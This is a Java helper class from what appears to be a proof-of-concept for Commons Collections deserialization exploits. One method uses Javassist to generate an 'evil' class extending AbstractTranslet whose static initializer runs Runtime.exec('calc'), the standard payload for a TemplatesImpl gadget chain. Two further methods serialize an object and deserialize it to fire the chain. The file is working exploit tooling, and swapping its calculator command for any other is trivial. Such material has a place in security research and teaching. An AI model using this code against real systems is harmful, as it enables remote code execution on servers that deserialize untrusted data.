package mypoc.CCExp;


import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassClassPath;
import javassist.ClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class ToolClass {

    public static byte[] getEvilClassFilebytes() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass calc = pool.makeClass("Calc");
        String cmd = "java.lang.Runtime.getRuntime().exec('calc');".replace("'", "\"");
        calc.makeClassInitializer().insertBefore(cmd);
        calc.setSuperclass(pool.get(AbstractTranslet.class.getName()));

        return calc.toBytecode();
    }

    public static ByteArrayOutputStream serializeData(Object object) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        objectOutputStream.close();
        return byteArrayOutputStream;
    }

    public static void unserializeData(ByteArrayOutputStream byteArrayOutputStream) throws Exception {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
}
